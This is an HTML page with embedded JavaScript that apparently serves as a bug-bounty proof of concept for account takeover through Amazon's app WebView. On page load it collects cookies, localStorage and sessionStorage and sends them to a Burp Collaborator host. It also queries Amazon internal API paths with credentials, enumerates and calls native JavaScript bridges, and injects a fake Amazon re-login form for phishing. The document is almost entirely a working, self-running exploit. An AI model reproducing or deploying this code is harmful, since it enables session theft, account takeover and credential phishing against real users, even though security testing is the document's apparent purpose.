<!DOCTYPE html>
<html>
<head>
    <title>Amazon WebView ATO Escalation Test</title>
    <meta charset="UTF-8">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            background: #f0f0f0;
        }
        .test { 
            background: white; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 5px; 
            border-left: 4px solid #007185;
        }
        .success { border-left-color: #00a652; }
        .error { border-left-color: #d13212; }
        h1 { color: #232f3e; }
        h3 { color: #007185; margin-top: 0; }
        .data { 
            background: #f8f9fa; 
            padding: 10px; 
            border-radius: 3px; 
            font-family: monospace; 
            white-space: pre-wrap; 
            max-height: 200px; 
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <h1>🎯 Amazon WebView ATO Escalation Test</h1>
    <p><strong>Testing for:</strong> Session theft, API access, privilege escalation</p>

    <div id="results"></div>

    <script>
        // Collaborator URL - replace with your Burp Collaborator domain
        const COLLABORATOR = 'https://q3u69ra2o7552bdn411lv4ybj2ptdl1a.oastify.com';
        
        let results = {};
        let testCount = 0;

        function log(category, message, data = null, isSuccess = false) {
            console.log(`[${category}] ${message}`, data);
            
            const resultsDiv = document.getElementById('results');
            const testDiv = document.createElement('div');
            testDiv.className = `test ${isSuccess ? 'success' : (data ? 'success' : 'error')}`;
            
            let html = `<h3>${category}</h3><p>${message}</p>`;
            if (data) {
                html += `<div class="data">${typeof data === 'object' ? JSON.stringify(data, null, 2) : data}</div>`;
            }
            testDiv.innerHTML = html;
            resultsDiv.appendChild(testDiv);
            
            // Store result for final exfiltration
            results[category] = { message, data, success: !!data };
        }

        function exfiltrate(endpoint, data) {
            try {
                const img = new Image();
                img.src = `${COLLABORATOR}/${endpoint}?data=${encodeURIComponent(JSON.stringify(data))}`;
                
                // Also try fetch if available
                fetch(`${COLLABORATOR}/${endpoint}`, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                }).catch(() => {});
            } catch(e) {
                console.log('Exfiltration failed:', e);
            }
        }

        // Test 1: Session Cookie Access
        function testSessionCookies() {
            testCount++;
            try {
                const cookies = document.cookie;
                if (cookies && cookies.length > 0) {
                    log('🍪 Session Cookies', 'SUCCESS: Found session cookies!', cookies, true);
                    exfiltrate('session_cookies', {cookies: cookies, domain: window.location.hostname});
                    return true;
                } else {
                    log('🍪 Session Cookies', 'No cookies accessible', null);
                    return false;
                }
            } catch(e) {
                log('🍪 Session Cookies', `Error: ${e.message}`, null);
                return false;
            }
        }

        // Test 2: Local Storage Access
        function testLocalStorage() {
            testCount++;
            try {
                let localData = {};
                let hasData = false;
                
                for(let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    localData[key] = value;
                    hasData = true;
                }
                
                if (hasData) {
                    log('💾 Local Storage', 'SUCCESS: Found localStorage data!', localData, true);
                    exfiltrate('local_storage', localData);
                    return true;
                } else {
                    log('💾 Local Storage', 'No localStorage data found', null);
                    return false;
                }
            } catch(e) {
                log('💾 Local Storage', `Error: ${e.message}`, null);
                return false;
            }
        }

        // Test 3: Session Storage Access
        function testSessionStorage() {
            testCount++;
            try {
                let sessionData = {};
                let hasData = false;
                
                for(let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const value = sessionStorage.getItem(key);
                    sessionData[key] = value;
                    hasData = true;
                }
                
                if (hasData) {
                    log('🔒 Session Storage', 'SUCCESS: Found sessionStorage data!', sessionData, true);
                    exfiltrate('session_storage', sessionData);
                    return true;
                } else {
                    log('🔒 Session Storage', 'No sessionStorage data found', null);
                    return false;
                }
            } catch(e) {
                log('🔒 Session Storage', `Error: ${e.message}`, null);
                return false;
            }
        }

        // Test 4: Amazon Internal API Access
        function testAmazonAPIs() {
            testCount++;
            const apiEndpoints = [
                '/api/customer/profile',
                '/api/user/account',
                '/api/auth/session',
                '/gp/customer/account/manage/summary',
                '/gp/css/homepage.html',
                '/api/amazonpay/user',
                '/api/cart/active',
                '/api/orders/recent',
                '/api/recommendations',
                '/api/prime/membership'
            ];

            let successCount = 0;
            let apiResults = {};

            apiEndpoints.forEach((endpoint, index) => {
                setTimeout(() => {
                    fetch(endpoint, {
                        credentials: 'include',
                        headers: {
                            'X-Requested-With': 'AmazonWebView'
                        }
                    })
                    .then(response => {
                        if (response.ok) {
                            return response.text();
                        } else {
                            throw new Error(`HTTP ${response.status}`);
                        }
                    })
                    .then(data => {
                        successCount++;
                        apiResults[endpoint] = {status: 'success', data: data.substring(0, 1000)};
                        log('🔌 Amazon API', `SUCCESS: ${endpoint} accessible!`, data.substring(0, 500), true);
                        exfiltrate('api_success', {endpoint: endpoint, data: data.substring(0, 1000)});
                    })
                    .catch(error => {
                        apiResults[endpoint] = {status: 'failed', error: error.message};
                        if (index === apiEndpoints.length - 1 && successCount === 0) {
                            log('🔌 Amazon API', 'All API endpoints failed', apiResults);
                        }
                    });
                }, index * 1000); // Stagger requests
            });
        }

        // Test 5: Cross-Origin Request Testing
        function testCrossOriginRequests() {
            testCount++;
            const testDomains = [
                'https://www.amazon.in',
                'https://amazonpay.amazon.in', 
                'https://payments.amazon.in',
                'https://api.amazon.in',
                'https://signin.aws.amazon.com'
            ];

            testDomains.forEach((domain, index) => {
                setTimeout(() => {
                    fetch(`${domain}/`, {
                        method: 'GET',
                        credentials: 'include'
                    })
                    .then(response => response.text())
                    .then(data => {
                        log('🌐 Cross-Origin', `SUCCESS: Can access ${domain}`, data.substring(0, 200), true);
                        exfiltrate('cross_origin_success', {domain: domain, data: data.substring(0, 500)});
                    })
                    .catch(error => {
                        // Silent fail for cross-origin - expected
                    });
                }, index * 800);
            });
        }

        // Test 6: JavaScript Bridge Discovery (Enhanced)
        function testJSBridges() {
            testCount++;
            const bridges = [
                'NativeInterface', 'AndroidInterface', 'smash', 'JSISecureStorage',
                'ReactNativeWebView', 'APPToBrowserSSOJSBridge', 'MAPAndroidJSBridge',
                'IDENTITY_MOBILE', 'FidoAuthenticatorJSBridge', 'IDENTITY_MOBILE_NAVIGATION',
                'IDENTITY_MOBILE_PHONE_NUMBER_PICKER', 'IDENTITY_MOBILE_PASSKEY',
                'AmazonPayBridge', 'PaymentBridge', 'WalletBridge', 'UPIBridge'
            ];
            
            let foundBridges = [];
            
            bridges.forEach(bridge => {
                if (window[bridge]) {
                    let bridgeInfo = {name: bridge, methods: []};
                    try {
                        for (let prop in window[bridge]) {
                            if (typeof window[bridge][prop] === 'function') {
                                bridgeInfo.methods.push(prop);
                            }
                        }
                    } catch(e) {}
                    foundBridges.push(bridgeInfo);
                }
            });
            
            if (foundBridges.length > 0) {
                log('🌉 JS Bridges', 'SUCCESS: Found JavaScript bridges!', foundBridges, true);
                exfiltrate('js_bridges_found', foundBridges);
                
                // Test the bridges
                foundBridges.forEach(bridge => {
                    if (bridge.name === 'NativeInterface' && bridge.methods.includes('triggerJSEvent')) {
                        try {
                            const response = window.NativeInterface.triggerJSEvent('{"test": true}');
                            log('🌉 JS Bridge Test', `NativeInterface response: ${response}`, null, true);
                            exfiltrate('bridge_response', {bridge: 'NativeInterface', response: response});
                        } catch(e) {
                            log('🌉 JS Bridge Test', `NativeInterface error: ${e.message}`, null);
                        }
                    }
                });
            } else {
                log('🌉 JS Bridges', 'No JavaScript bridges found', null);
            }
        }

        // Test 7: Context and Origin Information
        function testContext() {
            testCount++;
            const contextInfo = {
                url: window.location.href,
                origin: window.location.origin,
                hostname: window.location.hostname,
                protocol: window.location.protocol,
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                title: document.title,
                hasParent: window.parent !== window,
                hasTop: window.top !== window,
                isSecure: window.location.protocol === 'https:',
                timestamp: new Date().toISOString()
            };
            
            log('📍 WebView Context', 'Context information collected', contextInfo, true);
            exfiltrate('context_info', contextInfo);
        }

        // Test 8: Payment Form Injection Test
        function testPaymentFormInjection() {
            testCount++;
            // Create a fake Amazon payment form to test for credential harvesting
            const fakeForm = `
                <div style="position: fixed; top: 50px; left: 50px; right: 50px; background: white; 
                           border: 2px solid #ff9900; border-radius: 8px; padding: 20px; z-index: 9999;">
                    <h2 style="color: #232f3e; margin-top: 0;">⚠️ Session Expired - Re-authenticate</h2>
                    <p>Your Amazon session has expired. Please enter your credentials to continue:</p>
                    <input type="email" placeholder="Email or mobile number" style="width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ccc;">
                    <input type="password" placeholder="Amazon password" style="width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ccc;">
                    <button onclick="this.parentElement.style.display='none'; alert('Credentials would be stolen here!')" 
                            style="background: #ff9900; color: white; padding: 10px 20px; border: none; border-radius: 4px; margin: 10px 0;">
                        Continue
                    </button>
                    <p style="font-size: 12px; color: #666;">This demonstrates perfect phishing capability within Amazon app context</p>
                </div>
            `;
            
            setTimeout(() => {
                document.body.innerHTML += fakeForm;
                log('🎣 Phishing Test', 'Fake Amazon login form injected successfully!', 
                    'Form demonstrates perfect UI spoofing within Amazon app', true);
                exfiltrate('phishing_demo', {status: 'injected', context: 'amazon_webview'});
            }, 2000);
        }

        // Execute all tests
        function runAllTests() {
            log('🚀 Test Suite', 'Starting Amazon WebView ATO escalation tests...', null, true);
            
            // Run tests with delays to avoid overwhelming the system
            setTimeout(testContext, 500);
            setTimeout(testSessionCookies, 1000);
            setTimeout(testLocalStorage, 1500);
            setTimeout(testSessionStorage, 2000);
            setTimeout(testJSBridges, 2500);
            setTimeout(testAmazonAPIs, 3000);
            setTimeout(testCrossOriginRequests, 4000);
            setTimeout(testPaymentFormInjection, 5000);
            
            // Final summary
            setTimeout(() => {
                const summary = {
                    testsRun: testCount,
                    results: results,
                    overallSuccess: Object.values(results).some(r => r.success),
                    timestamp: new Date().toISOString(),
                    context: 'amazon_webview_ato_test'
                };
                
                exfiltrate('final_summary', summary);
                
                log('📊 Test Summary', 'All tests completed!', 
                    `${Object.values(results).filter(r => r.success).length} successful tests out of ${testCount}`, true);
                    
            }, 10000);
        }

        // Start tests when page loads
        window.onload = runAllTests;
    </script>
</body>
</html>
